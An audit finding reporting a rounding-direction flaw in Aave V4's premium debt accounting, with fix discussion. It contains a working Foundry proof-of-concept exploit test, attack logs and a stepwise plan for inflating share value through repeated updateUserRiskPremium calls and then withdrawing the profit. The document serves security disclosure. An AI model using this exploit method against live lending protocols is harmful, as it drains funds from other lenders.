# Malicious users can take advan-tage of the rounding direction of a high-value & low-decimal asset

## Summary

*No summary available*

## GitHub Source Code

- **Link**: https://github.com/sherlock-protocol/sherlock-reports/blob/main/audits/2026.02.05%20-%20Final%20-%20Aave%20Labs%20Collaborative%20Audit%20Report%201770295450.pdf
- **Valid**: ✓ Yes

## Content

Source: https://github.com/sherlock-audit/2025-10-aave-v4-oct-6th/issues/103

### Vulnerability Detail

Executing `updateUserRiskPremium()` function consumes around 63556 gas.
The current gas price at the time of writing this report (18 Oct 2025) on the Base chain is
0.003 Gwei. Assume that the average ETH price is around 3500 USD. In this case, the
cost for executing the transaction will be around 0.0007 USD.
```
uint256 gasBefore = gasleft();
spoke1.updateUserRiskPremium(alice);
uint256 gasAfter = gasleft();
console.log("Gas used:", gasBefore - gasAfter);
Result: Gas used: 63556
```
When an `updateUserRiskPremium()` transaction is executed, the premium debt of the
hub's asset, the spoke's reserve, and the user position will be slightly inflated by up to 2
wei due to the internal rounding direction. This behavior has been documented in the
comment in Line 699:
```
File: Hub.sol
681: function _applyPremiumDelta(
..SNIP..
699: // can increase due to precision loss on premium (drawn unchanged)
700: require(asset.premium() + premiumAmount - assetPremiumBefore <= 2,
  ,→ InvalidPremiumChange());
701: uint256 spokePremiumAfter = _getSpokePremium(spoke, assetId);
702: require(spokePremiumAfter + premiumAmount - spokePremiumBefore <= 2,
  ,→ InvalidPremiumChange());
```
Note
Note 1: The `updateUserRiskPremium()` will internally trigger the `Spoke._notifyRiskPremium`
```
Update() -> Hub.refreshPremium() -> Hub._applyPremiumDelta().
```
Note 2: Up to 2 wei is due to the first variable of the formula being rounded up (`hub.previ`
`ewRestoreByShares(assetId, oldPremiumShares)` ) while the second variable (`oldPremiumO`
`ffset` ) is rounded down [here](https://github.com/aave/aave-v4/blob/849c30056ad0bd59c2fd31036407e80d9e67cbd8/src/spoke/Spoke.sol#L803)[.](https://github.com/aave/aave-v4/blob/849c30056ad0bd59c2fd31036407e80d9e67cbd8/src/spoke/Spoke.sol#L803)
Note 3: The `updateUserRiskPremium()` can continue to be executed even after the
account's health factor is below 1e18 and the debt continues to increase by 1-2 wei
The following demonstrates the side effects of calling the `updateUserRiskPremium()`
function repeatedly. The premium debt increased by 100,000 wei (From 7 to 100007) after
running 100,000 iterations of `updateUserRiskPremium` . Note that in this specific example,
it only increases by 1 wei in each call, but other examples can increase the debt by 2 wei
after each call, as mentioned in the codebase's comment.
```
[PASS] test_repeatUpdateRisk() (gas: 6285631650)
Logs:
  #################### Initial State ####################
  =========== Print Debt Data ===========
  Alice's preimumDebt = 0
  Hub's assetPremium = 0
  Hub's totalAddedAssets = 15000
  Hub's totalAddedShares = 15000
  Alice's healthFactor = 10013333333333333333
  #################### Initial State after 7 days ####################
  =========== Print Debt Data ===========
  Alice's preimumDebt = 7
  Hub's assetPremium = 7
  Hub's totalAddedAssets = 15051
  Hub's totalAddedShares = 15001
  Alice's healthFactor = 9979403361902863597
  #################### End State after calling updateUserRiskPremium() 100,000
       ,→ times ####################
  Number of iterations ran = 100000
  =========== Print Debt Data ===========
  Alice's preimumDebt = 100007
  Hub's assetPremium = 100007
  Hub's totalAddedAssets = 115051
  Hub's totalAddedShares = 15001
  Alice's healthFactor = 1305507992107847824
```
The protocol supports asset tokens with decimals from 5 to 18.
```
File: Hub.sol
34: /// @inheritdoc IHub
35: uint8 public constant MIN_ALLOWED_UNDERLYING_DECIMALS = 5;
```
Assume that BTCX token (e.g., a new derivative asset of BTC) is five (5) decimal precision
and worth 100,000 USD. In this case, 1 unit of BTCX is 1e5, and 1 wei is worth 1 USD. BTCX.
The token has been added as a supported asset in the hub and a supported reserve asset
in the spoke.
Assume that Bob owns a significant share of the total BTCX token supply in the hub,
which he supplied via one of the spokes.
Let's say Bob currently owns 5% of the total shares for BTCX assets in the hub.
The value/price of each BTCX share is calculated based on the following formula:
```
totalAddedAssets = asset.liquidity + asset.swept + asset.deficit + (asset.drawn +
  ,→ asset.premium)
sharePrice = totalAddedAssets / totalAddedShares
```
In this case, Bob will open a small BTCX position in a spoke. For each `updateUserRiskPrem`
`ium()` function he executed, the `totalAddedAssets` will increase by 1 wei of BTCX, which is
equal to 1 USD in value. 1 BTCX (100_000 wei = 1e5) is worth 100,000 USDC, so 1 wei is worth
1 USD.
Since Bob owns 5% of the total shares, he will be entitled to 0.05 USD of the value, while
he only spent 0.00067 USD on the gas fee (profitable after taking into account of the gas
cost).
Bob repeatedly calls this function to inflate the value of his shares and then withdraws
all his shares.
This should ideally be done within a single block or within a few blocks. Otherwise,
liquidators might attempt to liquidate the position. Even if liquidation occurs, a
malicious user can create a new position and continue the attack.
If Bob enables his BTCX's supplied shares as collateral in his account, this would also
increase its borrowing power since the value of his supplied shares increases. He could
proceed to borrow more assets from the protocol.
POC
First, define a new token asset (BTCX) with 5 decimals and worth 100,000 USD in the `Base.`
`t.sol` test file. Then, copy the following test function to the `Spoke.PositionManager.t.so`
`l` test file.
```
function test_exploitRepeatUpdateRisk() public {
  uint256 btcxAssetId = spoke1.getReserve(_btcxReserveId(spoke1)).assetId;
  uint256 btcxReserveId = _btcxReserveId(spoke1); // BTCX's collateral factor = 78%
  // Bob (malicious user) own 100_000
  // Other random users own 900_000
  // Virtual shares = 1_000_000
  // Total shares = 2_000_000
  // Following add 1_000_000 shares to simulate the above setup
  deal(spoke1, btcxReserveId, address(this), 100_000);
  Utils.approve(spoke1, btcxReserveId, address(this), UINT256_MAX);
  Utils.supplyCollateral(spoke1, btcxReserveId, address(this), 100_000,
       ,→ address(this)); // Bob's position
  _openSupplyPosition(spoke1, btcxReserveId, 900_000); // positions of other users
  // Create a dust position for the sole purpose of triggering
       ,→ updateUserRiskPremium() to exploit the rounding error
  // Alice's address is also owned by Bob
  Utils.supplyCollateral(spoke1, _usdxReserveId(spoke1), alice, 10e6, alice); //
       ,→ supplies 10 USDX (worth 10 USD only)
  Utils.borrow(spoke1, btcxReserveId, alice, 7, alice); // Alice's HF is
       ,→ 1000000012820512984
  uint256 valueOfBTCXShareBefore = hub1.previewRemoveByShares(btcxAssetId, 100_000);
  console.log("100_000 BTCX is worth (before exploit) = ", valueOfBTCXShareBefore);
  vm.warp(block.timestamp + 7 days); // warp 7 days so that there is debt to be
```
,→ `accrue`
```
  console.log("BTCX balance of hub1 (Before Attack) = ",
       ,→ tokenList.btcx.balanceOf(address(hub1)));
  vm.startPrank(alice);
  uint i = 0;
  for (; i < 100_000; i++) {
    spoke1.updateUserRiskPremium(alice);
  }
  vm.stopPrank();
  console.log("BTCX balance of hub1 (After 100_000 loop) = ",
       ,→ tokenList.btcx.balanceOf(address(hub1)));
  uint256 valueOfBTCXShareAfter = hub1.previewRemoveByShares(btcxAssetId, 100_000);
  uint256 gainInBTCX = valueOfBTCXShareAfter - valueOfBTCXShareBefore;
  console.log("100_000 BTCX is worth (after exploit) = ", valueOfBTCXShareAfter);
  console.log("Gain in BTCX after exploit = ", gainInBTCX); // Gain 5000
  uint256 withdrawBefore = tokenList.btcx.balanceOf(address(this));
  spoke1.withdraw(btcxReserveId, 105_000, address(this));
  console.log("Attacker received (in BTCX)= ",
       ,→ tokenList.btcx.balanceOf(address(this)) - withdrawBefore);
  console.log("BTCX balance of hub1 (After Attack) = ",
       ,→ tokenList.btcx.balanceOf(address(hub1)));
}
```
The test shows that increasing the premium debt by 100,000 wei (1e5) consumes
5173606869 gas, which costs around 55 USD based on the gas cost in the Base chain
mentioned at the start of the report.
```
forge test --match-test test_exploitRepeatUpdateRisk -vvv
[PASS] test_exploitRepeatUpdateRisk() (gas: 5173606869)
Logs:
  100_000 BTCX is worth (before exploit) = 100000
  BTCX balance of hub1 (Before Attack) = 999993
  BTCX balance of hub1 (After 100_000 loop) = 999993
  100_000 BTCX is worth (after exploit) = 105000
  Gain in BTCX after exploit = 5000
  Attacker received (in BTCX)= 105000
  BTCX balance of hub1 (After Attack) = 894993
```
After the attack, Bob gained 5000 wei of BTCX, worth 5000 USD, while spending only 55
USD on the gas fee, making this a profitable attack.

### Impact

If a high-value, low-decimal asset is supported, a malicious user (or a group of majority
shareholders) could potentially increase the value of their supplied shares or collateral
profitably, even after accounting for gas costs on certain chains.
Malicious users with inflated share value will exit promptly, potentially leaving the
remaining shareholders with shares not backed by any assets unless the entire debt in
the malicious position is eventually repaid. However, this will not happen, as there is no
incentive for the malicious user to repay.
Furthermore, as shown in the test result above, the health factor of the malicious
position drops from 1.001 to 0.13 after the attack, indicating that bad debt and deficits
will be created. Someone (likely the umbrella spoke) will have to incur a loss by covering
the deficit.
Note
Impact (High) - Funds are directly or nearly directly at risk
Likelihood (Medium) - Might occur under specific conditions when a particular ERC20
token (High value, Low Decimal token) is used on the platform
Severity (High) based on V4 Threat Model - Vulnerability Severity Matrix

### Code Snippet

[https://github.com/sherlock-audit/2025-10-aave-v4-oct-6th/blob/d792069ed8a08ef52](https://github.com/sherlock-audit/2025-10-aave-v4-oct-6th/blob/d792069ed8a08ef5226d77a1299c9d34aa2e6a7b/aave__aave-v4/src/hub/Hub.sol#L699)
[26d77a1299c9d34aa2e6a7b/aave__aave-v4/src/hub/Hub.sol#L699](https://github.com/sherlock-audit/2025-10-aave-v4-oct-6th/blob/d792069ed8a08ef5226d77a1299c9d34aa2e6a7b/aave__aave-v4/src/hub/Hub.sol#L699)

### Tool Used

Manual Review

### Recommendation

Due to the current rounding direction, an additional 1 or 2 wei of assets is added to the
debt, and the intention is to always favor the protocol by having the users (borrower)
repay more debts instead of the other way round.
However, the issue here is that another group of protocol users (lenders) indirectly
benefits from the extra 1 or 2 wei of assets given to them, which opens up the
opportunity for some lenders to exploit this to their advantage.
One possible solution is to discard the excess premium debt dust (1-2 wei) resulting from
rounding errors to ensure that neither the borrower nor the lenders benefit from the
rounding direction.

### Discussion

Aave Labs
Premium accounting is now calculated and stored with full precision (token decimals
augmented with a Ray, i.e. 27 decimals) to avoid rounding issues from Ray math. As a
result, a user’s premium debt does not immediately change after any action that can be
executed (such as `updateUserRiskPremium` ), eliminating any impact that one user’s
actions could have on other users’ positions in the system. PR: [https://github.com/aave/](https://github.com/aave/aave-v4/pull/991)
[aave-v4/pull/991](https://github.com/aave/aave-v4/pull/991) & https://github.com/aave/aave-v4/pull/907
Lucas | Sherlock
After internal discussion, this is being downgraded to Medium. Fix is confirmed with PRs
[#991](https://github.com/aave/aave-v4/pull/991) and [#907](https://github.com/aave/aave-v4/pull/907).